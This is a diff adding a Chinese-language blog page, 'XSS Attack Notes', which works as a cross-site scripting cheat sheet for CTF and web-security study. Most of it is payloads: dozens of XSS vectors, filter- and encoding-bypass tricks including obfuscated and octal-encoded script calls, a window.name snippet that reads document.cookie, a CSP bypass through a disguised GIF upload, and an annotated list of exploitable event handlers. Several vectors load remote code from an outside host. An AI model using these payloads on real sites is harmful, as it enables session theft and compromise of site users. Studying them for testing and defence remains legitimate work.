@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang=zh-CN>
+  <head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="description" content="Purse the balance of everything.">
+  <meta name="keywords" content="CTF, Blog">
+  
+    <link rel="icon" href>
+  
+    
+  <title>XSS Attack Notes | Mads Blog</title>
+  <link rel="stylesheet" href="/style.css">
+  <link rel="stylesheet" href="/css/my.css">
+  <link rel="stylesheet" href="/lib/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/gitalk.css">
+  <script src="/lib/gitalk.min.js"></script>
+  <link href="https://cdn.bootcss.com/font-awesome/5.7.0/css/all.css" rel="stylesheet">
+
+</head>
+
+<body>
+  <header>
+  <div class="header-container">
+    <a class='logo' href="/">
+      <i class="fas fa-cat" style="margin-right: 10px"></i>
+      <span>Mads Blog</span>
+    </a>
+    <ul class="right-header">
+      
+        <li class="nav-item">
+          
+            <a href="/" class="item-link">首页</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/about" class="item-link">关于</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/archives" class="item-link">归档</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/tags" class="item-link">标签</a>
+          
+        </li>
+      
+    </ul>
+  </div>
+</header>
+
+  <main id='post'>
+  <div class="content">
+    <article>
+        <section class="content aath-body">
+          <h1>XSS Attack Notes</h1>
+          
+          <div class='post-meta'>
+            <i class="fa fa-calendar" aria-hidden="true"></i> <time>2019年04月10日</time>
+            
+            
+              | 
+                  <i class="fa fa-tags" aria-hidden="true"></i>
+                
+               
+  <a href="/tags/#Web安全" class='tag'>Web安全</a>
+
+  <a href="/tags/#XSS" class='tag'>XSS</a>
+
+
+            
+            | <i class="fas fa-edit" aria-hidden="true"></i> <time>2019年04月10日</time>
+          </div>
+          
+          <h1 id="XSS检测"><a href="#XSS检测" class="headerlink" title="XSS检测"></a>XSS检测</h1><p>用于探测XSS的存在性。</p>
+<ul>
+<li>XSS Locator(Polygot)<ul>
+<li><code>javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;&lt;svg/onload=&#39;+/&quot;/+/onmouseover=1/+/[*/[]/+alert(1)//&#39;&gt;</code></li>
+</ul>
+</li>
+</ul>
+<h1 id="基本姿势"><a href="#基本姿势" class="headerlink" title="基本姿势"></a>基本姿势</h1><p>基本姿势在<a href>XSS Concept Notes</a>的<code>HTML Injection</code>一节的<code>ways</code>部分作了基本介绍。XSS 目的是执行JS代码达成我们目的，总结下可以执行JS代码的地方：</p>
+<h2 id="可以X的地方"><a href="#可以X的地方" class="headerlink" title="可以X的地方"></a>可以X的地方</h2><ul>
+<li><code>&lt;script&gt;</code>标签内</li>
+<li>写在外部，通过<code>&lt;script src=</code>引入</li>
+<li>一些放URL的地方利用<code>javascript:</code>伪协议<ul>
+<li><code>src</code>处经过测试，可以work的好像只有<code>iframe</code>了，其他的比如<code>img</code>等只在IE6上测试通过</li>
+<li><code>form</code>的<code>action</code></li>
+<li>普通标签带有form属性的<code>formaction</code></li>
+<li><code>href</code></li>
+</ul>
+</li>
+<li><code>src</code>里用<code>data</code>协议</li>
+<li><code>iframe</code>的<code>srcdoc</code>直接写标签</li>
+<li>各种<code>on</code>事件里（on事件见附录</li>
+</ul>
+<h2 id="XSS-Vector-举栗"><a href="#XSS-Vector-举栗" class="headerlink" title="XSS Vector 举栗"></a>XSS Vector 举栗</h2><ul>
+<li><code>&lt;img src=javascript:alert(1) &gt;</code> // IE6</li>
+<li><code>&lt;IMG DYNSRC=&quot;javascript:alert(‘XSS’)&quot;&gt;</code> // IE6</li>
+<li><code>&lt;IMG LOWSRC=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</code> // IE6</li>
+<li><code>&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&#39;XSS&#39;))”&gt;</code>  // IE6</li>
+<li><code>&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&#39;XSS&#39;);”&gt;</code> // IE6</li>
+<li><code>&lt;table background=javascript:alert(1)&gt;&lt;/table&gt;</code> // IE6</li>
+<li><code>&lt;BODY BACKGROUND=”javascript:alert(‘XSS’)”&gt;</code> // IE6</li>
+<li><code>&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;</code> // IE6</li>
+<li><code>&lt;STYLE&gt;@im\port&#39;\ja\vasc\ript:alert(&quot;XSS&quot;)&#39;;&lt;/STYLE&gt;</code> // IE6</li>
+<li><code>&lt;STYLE&gt;@import&#39;http://xss.rocks/xss.css&#39;;&lt;/STYLE&gt;</code> //IE6</li>
+<li><code>&lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://xss.rocks/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt;</code> // IE6</li>
+<li><code>&lt;style&gt;#test{x:expression(alert(/XSS/))}&lt;/style&gt;</code> //IE6</li>
+<li><code>&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&#39;XSS&#39;);”&gt;</code> //IE6</li>
+<li><code>&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://xss.rocks/xss.css”&gt;</code> //IE6</li>
+<li><code>&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://xss.rocks/xss.css&gt;; REL=stylesheet”&gt;</code> // IE6</li>
+<li><code>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&#39;XSS&#39;);”&gt;</code> // IE6</li>
+<li><code>&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;&lt;/FRAMESET&gt;</code></li>
+<li><code>&lt;iframe src=javascript:alert(1) &gt;</code></li>
+<li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+<li><code>&lt;img src=# onerror=&quot;&quot; &gt;</code></li>
+<li><code>&lt;img src= onerror=&quot;&quot; &gt;</code></li>
+<li><code>&lt;img src=/ onerror=&quot;&quot; &gt;</code></li>
+<li><code>&lt;input onfocus=“alert(1)”autofocus&gt;</code></li>
+<li><code>&lt;input onblur=alert(1) autofocus&gt;&lt;input autofocus&gt;</code></li>
+<li><code>&lt;details open ontoggle=alert(1)&gt;</code></li>
+<li><code>&lt;svg onload=alert(1)&gt;</code></li>
+<li><code>&lt;svg/onload=alert(&#39;XSS&#39;)&gt;</code></li>
+<li><code>&lt;script&gt;Set.constructor(alert\x28/XSS/\x29)&lt;/script&gt;</code></li>
+<li><code>&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://xss.rocks/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;</code></li>
+<li><code>&lt;form action=“javascript:alert(1)&gt;</code></li>
+<li><code>&lt;form id=&quot;test&quot;&gt;&lt;/form&gt;&lt;button form=&quot;test&quot; formaction=&quot;javascript:alert(1)&quot;&gt;X&lt;/button&gt;</code></li>
+</ul>
+<h1 id="XSS-绕过"><a href="#XSS-绕过" class="headerlink" title="XSS 绕过"></a>XSS 绕过</h1><p>绕过是反反攻击的艺术，需要结合特定的filter进行分析构造。这里先介绍绕过所需的基本条件，然后介绍绕过的一些通用技术，具体的filter就不一一举例，但读者可以利用通用技术灵活组合，举一反三。</p>
+<h2 id="基本条件"><a href="#基本条件" class="headerlink" title="基本条件"></a>基本条件</h2><h3 id="解释器特性"><a href="#解释器特性" class="headerlink" title="解释器特性"></a>解释器特性</h3><ul>
+<li>HTML 标签大小写不敏感<ul>
+<li>HTML parser自动补全不闭合的标签(动态改变的可能不行)</li>
+</ul>
+</li>
+<li>HTML parser自动给属性后空白字符前的值加引号 如 <code>&lt;a onclick=alert(1) &gt;&lt;/a&gt;</code>  -&gt;  <code>&lt;a onclick=“alert(1)”&gt;&lt;/a&gt;</code></li>
+<li>HTML实体编码可以不带分号</li>
+<li>URL协议字段大小写不敏感</li>
+<li>URL协议如果没写默认为<code>location.protocol</code></li>
+<li>URL整个字段可以嵌入任意多个以下空白字符<ul>
+<li>[输入的TAB]</li>
+<li>使用HTML实体编码的 <code>&amp;#x0A &amp;#x0D &amp;#x09</code></li>
+</ul>
+</li>
+<li><code>&amp;#14;javascript:alert(‘XSS’);</code> URL协议前可以有任何十进制的1-32的字符</li>
+<li>畸形URL处理<ul>
+<li>www。google。com -&gt; <a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a> IE/Google/Firefox</li>
+<li><a href="http://www.google.com\abc" target="_blank" rel="noopener">www.google.com\abc</a> -&gt; <a href="http://www.google.com/abc" target="_blank" rel="noopener">www.google.com/abc</a> IE/Google</li>
+<li><a href="http://www.google.com?abc" target="_blank" rel="noopener">www.google.com?abc</a> -&gt; <a href="http://www.google.com/?abc" target="_blank" rel="noopener">www.google.com/?abc</a> IE/Google/Firefox</li>
+<li>[<a href="http://www.cnn.com]" target="_blank" rel="noopener">http://www.cnn.com]</a> Firefox</li>
+<li>[http://]<a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a> Firefox</li>
+<li>[<a href="http://www].google.com" target="_blank" rel="noopener">http://www].google.com</a> Firefox</li>
+<li>…</li>
+</ul>
+</li>
+<li>JavaScript Parser自动补全JS语句的分号</li>
+</ul>
+<h3 id="解释器的自动解码"><a href="#解释器的自动解码" class="headerlink" title="解释器的自动解码"></a>解释器的自动解码</h3><ul>
+<li>指令<ul>
+<li>HTML不会对标签名以及属性等keyword进行HTML实体解码</li>
+<li>URL的协议关键字用URL编码之后浏览器无法正确识别如（<code>h%74tp://baidu.com和javascrip%74:alert(1)</code>）都不会被正常识别</li>
+<li>JS的指令可以用\u的Unicode码点表示（只支持plane1码点即UCS-2 即16位Unicode字符）</li>
+</ul>
+</li>
+<li>数据<ul>
+<li>HTML parser会对数据（字符串）进行HTML实体解码</li>
+<li>URL的协议之后的部分会进行URL解码</li>
+<li>HTTP(S)协议的内容会进行进制识别（十进制、八进制、十六进制IP地址）</li>
+<li>JS的字符串会进行进制识别(要在引号内)，即<code>alert(‘\x74’) alert(‘\74’)</code> 都是合法的。以及和指令的码点表示类似，<code>alert(‘\u0074’)</code> 也合法</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>eval等函数相当于将指令-&gt;数据，从而可以利用JS的数据解码的特性如进制编码和\u编码来绕过过滤</p>
+</blockquote>
+<h3 id="通用绕过技术"><a href="#通用绕过技术" class="headerlink" title="通用绕过技术"></a>通用绕过技术</h3><ul>
+<li>特性绕过<ul>
+<li>大小写绕过</li>
+<li>不闭合标签<ul>
+<li><code>&lt;iframe src=javascript:alert(1)&gt;</code></li>
+<li><code>&lt;iframe src=javascript:alert(1)</code></li>
+</ul>
+</li>
+<li>不写引号</li>
+<li>不写分号</li>
+<li>不写协议(HTTP(S))</li>
+<li>畸形URL</li>
+</ul>
+</li>
+<li>编码绕过<ul>
+<li>HTML value部分进行HTML实体编码</li>
+<li>URL 数据部分(协议的冒号之后)进行URL编码</li>
+<li>HTTP(S)的IP使用进制转换（十进制、八进制十六进制IP）</li>
+<li>JS的指令使用Unicode码点绕过，数据使用进制编码、Unicode编码都行</li>
+<li>伪协议编码如 <code>&lt;iframe src=&quot;dAta:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;&lt;/iframe&gt;</code></li>
+<li>多重编码（记住解码顺序是HTML先） 如 <code>&lt;iframe src=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x36;&amp;#x31;&amp;#x25;&amp;#x36;&amp;#x63;&amp;#x25;&amp;#x36;&amp;#x35;&amp;#x25;&amp;#x37;&amp;#x32;&amp;#x25;&amp;#x37;&amp;#x34;&amp;#x25;&amp;#x32;&amp;#x38;&amp;#x25;&amp;#x32;&amp;#x37;&amp;#x25;&amp;#x37;&amp;#x38;&amp;#x25;&amp;#x37;&amp;#x33;&amp;#x25;&amp;#x37;&amp;#x33;&amp;#x25;&amp;#x32;&amp;#x37;&amp;#x25;&amp;#x32;&amp;#x39;&quot;&gt;&lt;/iframe&gt;</code>是个合法的XSS Payload</li>
+<li>页面编码如页面是<code>GBK/GB2312</code>，<code>%c1\ == ‘羂’</code>， 因为<code>%c1</code>是<code>gbk</code>编码中的区位符号，与后16位的偏移一起组合成为一个汉字，所以就会把转义符号给“吃”掉了。</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>编码部分我做了个镜像整合了余弦大大的<code>xssor2</code>和著名的<code>xssee</code>，并做了小修改. docker pull lxzmads/xssxor</p>
+</blockquote>
+<ul>
+<li>可选替代绕过<ul>
+<li>HTML<ul>
+<li>tab代替空格</li>
+<li><code>/</code> 代替 空格</li>
+</ul>
+</li>
+<li>JS<ul>
+<li>正则代替引号如<code>alert(/xss/)</code></li>
+<li>反引号代替括号(带标签模版字符串)</li>
+<li>方法劫持<ul>
+<li><code>onerror=eval;throw&#39;=alert\x281\x29’;</code> 绕过括号 = 因为Chrome和Opera会在异常前加个Uncaught</li>
+</ul>
+</li>
+<li>Object运算代换<ul>
+<li><code>‘xss’ == &#39;x&#39; + &#39;xs&#39;</code></li>
+<li><code>‘xss’ == String.fromCharCode(120,115,115)</code></li>
+<li><code>‘xss’ == unescape(&#39;%78%73%73&#39;)</code></li>
+<li><code>‘xss’ == atob(&#39;eHNz&#39;)</code></li>
+<li><code>a=alert,a(1)</code></li>
+<li><code>[1].find(alert)</code></li>
+<li><code>(alert)(1)</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>过滤器逻辑绕过<ul>
+<li>过滤一次为空：双写</li>
+<li>服务端解码两次: 二次编码</li>
+</ul>
+</li>
+<li>服务端函数变量<ul>
+<li>PHP<ul>
+<li><code>htmlentities()</code>函数没有过滤单引号，适用于在变量处的xss。</li>
+<li>POST的action字段使用了php的<code>$_SERVER[&#39;PHP_SELF&#39;]</code>, 利用url的参数</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>代码变换绕过</p>
+<ul>
+<li>“超函数”——可以将代码变为数据，从而使用数据的各种编码绕过<ul>
+<li><code>eval</code><ul>
+<li><code>a=`aler`;b=`t`;c=&#39;(`xss`);&#39;;eval(a+b+c) -&gt; alert(`xss`)</code></li>
+<li><code>eval(function(p,a,c,k,e,r){e=String;if(!&#39;&#39;.replace(/^/,String)){while(c--)r[c]=k[c]||c;k=[function(e){return r[e]}];e=function(){return&#39;\\w+&#39;};c=1};while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;+e(c)+&#39;\\b&#39;,&#39;g&#39;),k[c]);return p}(&#39;0(/1/)&#39;,2,2,&#39;alert|xss&#39;.split(&#39;|&#39;),0,{}))</code></li>
+</ul>
+</li>
+<li><code>top</code><ul>
+<li><code>top[&quot;al&quot;+&quot;ert&quot;](`xss`); -&gt; alert(`xss`)</code></li>
+</ul>
+</li>
+<li><code>window parent self this constructor</code><ul>
+<li><code>Set.constructor(alert\x28document.domain\x29)</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>空属性<ul>
+<li><code>&lt;script/x&gt;alert(1)&lt;/script&gt;</code> 绕正则</li>
+</ul>
+</li>
+<li>注释符<ul>
+<li><code>&lt;&lt;SCRIPT&gt;alert(&#39;XSS&#39;);//&lt;&lt;/SCRIPT&gt;</code> 双写尖括号</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>综合Paylod举例</p>
+<ul>
+<li><code>[][&#39;\146\151\154\164\145\162&#39;][&#39;\143\157\156\163\164\162\165\143\164\157\162&#39;] (&#39;\141\154\145\162\164\50\61\51&#39;)()</code> 绕不准字母表</li>
+<li><code>(alert)(1)</code></li>
+<li><code>a=alert,a(1)</code></li>
+<li><code>[1].find(alert)</code></li>
+<li><code>top[&quot;al&quot;+&quot;ert&quot;](1)</code></li>
+<li><code>top[/al/.source+/ert/.source](1)</code></li>
+<li><code>top[&#39;al\145rt&#39;](1)</code></li>
+<li><code>top[8680439..toString(30)](1)</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h2><ul>
+<li>利用事件(其他写法)来缩短字节数<ul>
+<li><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> 比 <code>&quot;onclick=alert(1)//</code> 长</li>
+</ul>
+</li>
+<li>第二个思路是把长的Payload写到别处，然后用一个简短的reference来调用。<ul>
+<li>可以藏代码的地方就是可以自定义的地方</li>
+<li>比如<code>location.hash</code>。</li>
+<li>通过<code>&quot; onclick=&quot;eval(location.hash.substr(1))&quot;</code></li>
+<li>加载远程JS</li>
+<li>可控的页面内容，RPO载入</li>
+</ul>
+</li>
+<li>利用注释符绕过长度限制。就是利用<code>&lt;!-- --&gt;</code>注释掉html代码，打通若干个html标签</li>
+<li><code>&lt;base&gt;</code>标签劫持相对路径引入的资源</li>
+<li><code>window.name</code>可以缩短Payload长度<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.name=&quot;alert(document.cookie)&quot;;</span><br><span class="line">location.href=&quot;http://www.xssedsite.com/xssed.php&quot;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>在同一窗口打开具有XSS漏洞的站点，只需要 eval(name);就可以执行Payload,只有11个字符。</p>
+<h2 id="跨域限制绕过"><a href="#跨域限制绕过" class="headerlink" title="跨域限制绕过"></a>跨域限制绕过</h2><ul>
+<li><code>window</code></li>
+<li><code>postMessage</code></li>
+<li><em>TODO</em></li>
+</ul>
+<h2 id="CSP绕过"><a href="#CSP绕过" class="headerlink" title="CSP绕过"></a>CSP绕过</h2><ul>
+<li><p>文件上传注入,绕过CSP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a=//&lt;script&gt;</span><br><span class="line">alert(1)//&lt;/script&gt;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><em>TODO</em></p>
+</li>
+</ul>
+<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="Events-in-JavaScript"><a href="#Events-in-JavaScript" class="headerlink" title="Events in JavaScript"></a>Events in JavaScript</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">FSCommand() (攻击者当需要在嵌入的Flash对象中执行时可以使用此事件)</span><br><span class="line">onAbort() (当用户中止加载图片时)</span><br><span class="line">onActivate() (当对象激活时)</span><br><span class="line">onAfterPrint() (用户打印或进行打印预览后触发)</span><br><span class="line">onAfterUpdate() (从数据源对象更新数据后由数据对象触发)</span><br><span class="line">onBeforeActivate() (在对象设置为激活元素前触发)</span><br><span class="line">onBeforeCopy() (攻击者在选中部分拷贝到剪贴板前执行攻击代码-攻击者可以通过执行execCommand(&quot;Copy&quot;)函数触发)</span><br><span class="line">onBeforeCut() (攻击者在选中部分剪切到剪贴板前执行攻击代码)</span><br><span class="line">onBeforeDeactivate() (在当前对象的激活元素变化前触发)</span><br><span class="line">onBeforeEditFocus() (在一个包含可编辑元素的对象进入激活状态时或一个可编辑的对象被选中时触发)</span><br><span class="line">onBeforePaste() (在用户被诱导进行粘贴前或使用execCommand(&quot;Paste&quot;)函数触发)</span><br><span class="line">onBeforePrint() (用户需要被诱导进行打印或攻击者可以使用print()或execCommand(&quot;Print&quot;)函数).</span><br><span class="line">onBeforeUnload() (用户需要被诱导关闭浏览器-除非从父窗口执行，否则攻击者不能关闭当前窗口)</span><br><span class="line">onBeforeUpdate() (从数据源对象更新数据前由数据对象触发)</span><br><span class="line">onBegin() (当元素周期开始时由onbegin 事件立即触发)</span><br><span class="line">onBlur() (另一个窗口弹出当前窗口失去焦点时触发)</span><br><span class="line">onBounce() (当marquee对象的behavior属性设置为“alternate”且字幕的滚动内容到达窗口一边时触发)</span><br><span class="line">onCellChange() (当数据提供者的数据变化时触发)</span><br><span class="line">onChange() (select，text, 或TEXTAREA字段失去焦点并且值发生变化时触发)</span><br><span class="line">onClick() (表单中点击触发)</span><br><span class="line">onContextMenu() (用户需要在攻击区域点击右键)</span><br><span class="line">onControlSelect() (当用户在一个对象上创建控件选中区时触发)</span><br><span class="line">onCopy() (用户需要复制一些东西或使用execCommand(&quot;Copy&quot;)命令时触发)</span><br><span class="line">onCut() (用户需要剪切一些东西或使用execCommand(&quot;Cut&quot;)命令时触发)</span><br><span class="line">onDataAvailable() (用户需要修改元素中的数据，或者由攻击者提供的类似功能)</span><br><span class="line">onDataSetChanged() (当数据源对象变更导致数据集发生变更时触发)</span><br><span class="line">onDataSetComplete() (数据源对象中所有数据可用时触发)</span><br><span class="line">onDblClick() (用户双击一个表单元素或链接)</span><br><span class="line">onDeactivate() (在激活元素从当前对象转换到父文档中的另一个对象时触发)</span><br><span class="line">onDrag() (在元素正在拖动时触发)</span><br><span class="line">onDragEnd() (当用户完成元素的拖动时触发)</span><br><span class="line">onDragLeave() (用户在拖动元素离开放置目标时触发)</span><br><span class="line">onDragEnter() (用户将对象拖拽到合法拖曳目标)</span><br><span class="line">onDragOver() (用户将对象拖拽划过合法拖曳目标)</span><br><span class="line">onDragDrop() (用户将一个对象（例如文件）拖拽到浏览器窗口)</span><br><span class="line">onDragStart() (当用户开始拖动元素时触发)</span><br><span class="line">onDrop() (当拖动元素放置在目标区域时触发)</span><br><span class="line">onEnded() (在视频/音频（audio/video）播放结束时触发)</span><br><span class="line">onError() (在加载文档或图像时发生错误)</span><br><span class="line">onErrorUpdate() (当从数据源对象更新相关数据遇到错误时在数据绑定对象上触发)</span><br><span class="line">onFilterChange() (当滤镜完成状态变更时触发)</span><br><span class="line">onFinish() (当marquee完成滚动时攻击者可以执行攻击)</span><br><span class="line">onFocus() (当窗口获得焦点时攻击者可以执行攻击代码)</span><br><span class="line">onFocusIn() (当元素将要被设置为焦点之前触发)</span><br><span class="line">onFocusOut() (攻击者可以在窗口失去焦点时触发攻击代码)</span><br><span class="line">onHashChange() (当锚部分发生变化时触发攻击代码)</span><br><span class="line">onHelp() (攻击者可以在用户在当前窗体激活时按下F1触发攻击代码)</span><br><span class="line">onInput() (在 &lt;input&gt; 或 &lt;textarea&gt; 元素的值发生改变时触发)</span><br><span class="line">onKeyDown() (用户按下一个键的时候触发)</span><br><span class="line">onKeyPress() (在键盘按键被按下并释放一个键时触发)</span><br><span class="line">onKeyUp() (用户释放一个键时触发)</span><br><span class="line">onLayoutComplete() (用户进行完打印或打印预览时触发)</span><br><span class="line">onLoad() (攻击者在窗口加载后触发攻击代码)</span><br><span class="line">onLoseCapture() (可以由releaseCapture()方法触发)</span><br><span class="line">onMediaComplete() (当一个流媒体文件使用时，这个事件可以在文件播放前触发)</span><br><span class="line">onMediaError() (当用户在浏览器中打开一个包含媒体文件的页面，出现问题时触发事件)</span><br><span class="line">onMessage() (当页面收到一个信息时触发事件)</span><br><span class="line">onMouseDown() (攻击者需要让用户点击一个图片触发事件)</span><br><span class="line">onMouseEnter() (光标移动到一个对象或区域时触发)</span><br><span class="line">onMouseLeave() (攻击者需要让用户光标移动到一个图像或表格然后移开来触发事件)</span><br><span class="line">onMouseMove() (攻击者需要让用户将光标移到一个图片或表格)</span><br><span class="line">onMouseOut() (攻击者需要让用户光标移动到一个图像或表格然后移开来触发事件)</span><br><span class="line">onMouseOver() (光标移动到一个对象或区域)</span><br><span class="line">onMouseUp() (攻击者需要让用户点击一个图片)</span><br><span class="line">onMouseWheel() (攻击者需要让用户使用他们的鼠标滚轮)</span><br><span class="line">onMove() (用户或攻击者移动页面时触发)</span><br><span class="line">onMoveEnd() (用户或攻击者移动页面结束时触发)</span><br><span class="line">onMoveStart() (用户或攻击者开始移动页面时触发)</span><br><span class="line">onOffline() (当浏览器从在线模式切换到离线模式时触发)</span><br><span class="line">onOnline() (当浏览器从离线模式切换到在线模式时触发)</span><br><span class="line">onOutOfSync() (当元素与当前时间线失去同步时触发)</span><br><span class="line">onPaste() (用户进行粘贴时或攻击者可以使用execCommand(&quot;Paste&quot;)函数时触发)</span><br><span class="line">onPause() (在视频或音频暂停时触发)</span><br><span class="line">onPopState() (在窗口的浏览历史（history 对象）发生改变时触发)</span><br><span class="line">onProgress() (攻击者可以在一个FLASH加载时触发事件)</span><br><span class="line">onPropertyChange() (用户或攻击者需要改变元素属性时触发)</span><br><span class="line">onReadyStateChange() (每次 readyState 属性变化时被自动调用)</span><br><span class="line">onRedo() (用户返回上一页面时触发)</span><br><span class="line">onRepeat() (事件在播放完重复播放时触发)</span><br><span class="line">onReset() (用户或攻击者重置表单时触发)</span><br><span class="line">onResize() (用户改变窗口大小时，攻击者可以自动以这种方法触发:&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;)</span><br><span class="line">onResizeEnd() (用户完成改变窗体大小时触发)</span><br><span class="line">onResizeStart() (用户开始改变窗体大小时触发)</span><br><span class="line">onResume() (当元素继续播放时触发)</span><br><span class="line">onReverse() (当元素回放时触发)</span><br><span class="line">onRowsEnter() (用户或攻击者需要改变数据源中的一行)</span><br><span class="line">onRowExit() (用户或攻击者改变数据源中的一行后退出时触发)</span><br><span class="line">onRowDelete() (用户或攻击者需要删除数据源中的一行)</span><br><span class="line">onRowInserted() (user or attacker would needto insert a row in a data source)</span><br><span class="line">onScroll() (用户需要滚动或攻击者使用scrollBy()函数)</span><br><span class="line">onSeek() (当用户在元素上执行查找操作时触发)</span><br><span class="line">onSelect() (用户需要选择一些文本-攻击者可以以此方式触发: window.document.execCommand(&quot;SelectAll&quot;);)</span><br><span class="line">onSelectionChange() (当用户选择文本变化时触发-攻击者可以以此方式触发: window.document.execCommand(&quot;SelectAll&quot;);)</span><br><span class="line">onSelectStart() (当用户开始选择文本时触发-攻击者可以以此方式触发: window.document.execCommand(&quot;SelectAll&quot;);)</span><br><span class="line">onStart() (在marquee 对象开始循环时触发)</span><br><span class="line">onStop() (当用户按下停止按钮或离开页面时触发)</span><br><span class="line">onStorage() (当Web Storage更新时触发)</span><br><span class="line">onSyncRestored() (当元素与它的时间线恢复同步时触发)</span><br><span class="line">onSubmit() (需要用户或攻击者提交表单)</span><br><span class="line">onTimeError() (用户或攻击者设置时间属性出现错误时触发)</span><br><span class="line">onTrackChange() (用户或攻击者改变播放列表内歌曲时触发)</span><br><span class="line">onUndo() (用户返回上一浏览记录页面时触发)</span><br><span class="line">onUnload() (用户点击任意链接或按下后退按钮或攻击者强制进行点击时触发)</span><br><span class="line">onURLFlip() (当一个高级流媒体格式（ASF）文件，由一个HTML+TIME（基于时间交互的多媒体扩展）媒体标签播放时，可触发在ASF文件中内嵌的攻击脚本)</span><br><span class="line">seekSegmentTime() (这是一个方法可以定位元素某个时间段内中的特定的点，并可以从该点播放。这个段落包含了一个重复的时间线，并包括使用AUTOREVERSE属性进行反向播放。)</span><br></pre></td></tr></table></figure>
